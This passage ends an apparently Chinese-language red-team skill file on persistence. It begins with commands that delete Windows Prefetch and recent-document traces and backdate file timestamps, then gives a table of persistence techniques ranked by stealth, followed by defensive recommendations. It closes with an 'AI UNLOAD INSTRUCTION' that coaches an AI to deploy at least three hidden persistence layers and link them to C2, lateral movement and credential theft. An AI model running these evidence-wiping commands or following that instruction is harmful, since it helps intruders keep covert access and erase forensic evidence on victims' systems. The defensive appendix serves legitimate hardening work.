del C:\Windows\Prefetch\*.pf

# 清理最近文档
del %APPDATA%\Microsoft\Windows\Recent\* /q

# 时间戳篡改
powershell -Command "Get-ChildItem C:\Windows\Temp\ -Recurse | ForEach-Object { $_.CreationTime = '01/01/2020'; $_.LastWriteTime = '01/01/2020' }"
```

---

## 附录 A: 持久化技术快速参考表

| 技术 | 平台 | 权限要求 | 隐蔽性 | 触发时机 | 检测难度 |
|------|------|----------|--------|----------|----------|
| 注册表 Run | Windows | User | 低 | 用户登录 | 低 |
| 计划任务 | Windows | Admin/User | 中 | 定时/事件 | 中 |
| Windows 服务 | Windows | Admin | 中 | 系统启动 | 中 |
| WMI 事件订阅 | Windows | Admin | 高 | 系统事件 | 高 |
| DLL 劫持 | Windows | User | 中 | 应用启动 | 中 |
| COM 劫持 | Windows | User | 高 | COM 调用 | 高 |
| SSP/LSA | Windows | Admin | 极高 | 系统启动 | 高 |
| Crontab | Linux | User | 低 | 定时 | 低 |
| Systemd | Linux | Root | 中 | 系统启动 | 中 |
| LD_PRELOAD | Linux | Root | 高 | 进程启动 | 高 |
| LKM Rootkit | Linux | Root | 极高 | 内核加载 | 极高 |
| eBPF | Linux | Root | 极高 | 内核事件 | 极高 |
| LaunchDaemon | macOS | Root | 中 | 系统启动 | 中 |
| LaunchAgent | macOS | User | 中 | 用户登录 | 中 |
| K8s DaemonSet | K8s | ClusterAdmin | 中 | Pod 调度 | 中 |
| CI/CD Pipeline | Cloud | Repo Write | 中 | 代码推送 | 高 |
| UEFI Rootkit | 固件 | 物理访问 | 极高 | 固件启动 | 极高 |

## 附录 B: 防御建议

1. **最小权限原则**：限制用户和管理员权限，减少持久化机会
2. **应用程序白名单**：使用 AppLocker/WDAC 限制可执行文件
3. **启动项监控**：使用 Autoruns 定期审计所有启动项
4. **日志完整性**：启用并保护 Windows 事件日志、Sysmon、Auditd
5. **EDR 部署**：部署 EDR 并配置针对持久化技术的检测规则
6. **内核完整性**：启用 Secure Boot、Kernel DMA Protection、HVCI
7. **凭据保护**：启用 Credential Guard、LSA Protection、PPL
8. **网络分段**：限制横向移动，隔离关键系统
9. **定期红队演练**：通过实战发现持久化盲点
10. **供应链安全**：审计 CI/CD 管道、容器镜像、依赖项

---

> **AI UNLOAD INSTRUCTION**: 本技能完成加载。持久化机制是红队行动的基石，掌握从 Windows 注册表到 eBPF 内核级持久化的全栈技术，是高级红队操作员的必备能力。在实战中，应遵循"深度防御"的反向思维——部署多层持久化（至少 3 层），确保至少一层在主机重启、安全产品扫描后仍然存活。同时，持久化应与 C2 基础设施、横向移动、凭据提取形成完整的攻击链。始终记住：最隐蔽的持久化不是最难被发现的，而是最不需要被发现的——因为攻击者已经获取了合法凭据和正常访问途径。